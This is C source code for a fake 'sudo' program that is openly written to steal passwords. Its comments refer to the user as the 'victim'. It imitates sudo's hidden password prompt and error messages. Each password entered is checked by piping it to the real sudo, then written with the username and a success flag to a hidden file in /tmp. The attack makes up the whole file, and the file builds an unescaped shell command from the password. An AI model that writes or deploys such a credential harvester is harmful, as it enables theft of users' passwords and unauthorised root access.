#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <pwd.h>
#include <termios.h>

#define BUFFER_SIZE  100
#define MAX_PW_ATTEMPTS  3
#define DEFAULT_LOCATION "/tmp/.temp5678"

/* save_password()
*  Writes the username, supplied password by the victim and status to disk.
*
*  username: Victim's username
*  password: Victim's password
*  status: ERROR for incorrect password
*          SUCCESS for correct password
*
*/
int save_password(char *username, char *password, char *status)
{
    char text[BUFFER_SIZE] = {0};
    snprintf(text, sizeof(text), "%s:%s:%s\n", username, password, status);

    FILE *fp;
    fp = fopen(DEFAULT_LOCATION, "a+");
    if (fp != NULL)
    {
        fwrite(text, 1, sizeof(text), fp);
    }
    fclose(fp);
    return 0;
}

/* basic_sudo()
*  Simple executes sudo with the victim's command without trying to steal the password
*
*  arguments: Contains the victim's command
*
*/
int basic_sudo(char *arguments) {
    /* Contains the victim's original command */
    char orgiginal_cmd[BUFFER_SIZE] = {0};

    snprintf(orgiginal_cmd, sizeof(orgiginal_cmd), "/usr/bin/sudo%s", arguments);
    system(orgiginal_cmd);
    return 0;
}

/* check_sudo()
*  Tried to execute sudo to determine if user already has sudo access.
*  system() returns 256 on error which indicates no sudo access.
*
*  Returns: 0 if user does not have sudo access
*           1 if the user has sudo access
*/
int check_sudo() {
    int ret;
    ret = system("/usr/bin/sudo -n true 2>/dev/null");
    if (ret == 256) {
        return 0;
    } else {
        return 1;
    }
}

/* get_user_pass()
*  Gets the victim's password and hides the input in the terminal just like sudo.
*  Same arguments as getline().
*
*  getline() reads an entire line from stream, storing the address of
*  the buffer containing the text into *lineptr.  The buffer is null-
*  terminated and includes the newline character, if one was found.
*
*  If *lineptr is set to NULL and *n is set 0 before the call, then
*  getline() will allocate a buffer for storing the line.  This buffer
*  should be freed by the user program even if getline() failed." 
*
*/
ssize_t get_user_pass(char **lineptr, size_t *n, FILE *stream)
{
    struct termios old, new;
    int nread;

    /* Turn echoing off and fail if we can’t. */
    if (tcgetattr (fileno (stream), &old) != 0)
        return -1;
    new = old;
    new.c_lflag &= ~ECHO;
    if (tcsetattr (fileno (stream), TCSAFLUSH, &new) != 0)
        return -1;

    /* Read the password. */
    nread = getline (lineptr, n, stream);

    /* Restore terminal. */
    (void) tcsetattr (fileno (stream), TCSAFLUSH, &old);

    return nread;
}

int main(int argc, char const *argv[])
{
    struct passwd *usr = getpwuid(getuid());
    /* Contains the password for sudo access */
    char *password = NULL;
    /* The victim's intital parameters to run sudo with */
    char arguments[BUFFER_SIZE] = {0};
    /* Full command to trick the victim into beleiving sudo ran successfully */
    char command[BUFFER_SIZE] = {0};

    size_t len = 0;
    int args;
    int pw_attempts = 1;

    /* Gather all the arguments supplied by the user and store them in a buffer */
    for (args = 1; args < argc; ++args) {
        snprintf(arguments+strlen(arguments), sizeof(arguments)-strlen(arguments), " %s", argv[args]);
    }

    /* If we managed to get the current user, attempt to steal his password by faking sudo */
    if(usr) {
        /* Check if user already has sudo access */
        if (!check_sudo()) {
            /* Check if the victim supplied any arguments, if not simply run sudo */
            if (argc != 1) {
                while(pw_attempts <= MAX_PW_ATTEMPTS) {
                    printf("[sudo] password for %s: ", usr->pw_name);
                    get_user_pass(&password, &len, stdin);

                    /* Remove the \n at the end of the password, otherwise it messes up the command */
                    if(password[strlen(password)-1] == '\n') password[strlen(password)-1] = '\0';                 
                    
                    /* Build the full command to be executed */
                    snprintf(command, sizeof(command), "echo %s | /usr/bin/sudo -S%s 2>/dev/null", password, arguments);
                    printf("\n");
                    /* Check if victim entered the correct password. system() weirdly returns 256 on error */
                    if((system(command)) == 256) {
                        printf("Sorry, try again.\n");
                        save_password(usr->pw_name, password, "ERROR");
                    } else {
                        save_password(usr->pw_name, password, "SUCCESS");
                        break;
                    }

                    /* Give the victim MAX_PW_ATTEMPTS attempts to enter his password */
                    if (pw_attempts == MAX_PW_ATTEMPTS) {
                        printf("sudo: %d incorrect password attempts\n", MAX_PW_ATTEMPTS);
                    }

                    pw_attempts++;
                }

                free(password);
            } else {
                basic_sudo("");
            }
        } else {
            basic_sudo(arguments);
        }
    } else {
        basic_sudo(arguments);
    }
    return 0;
}
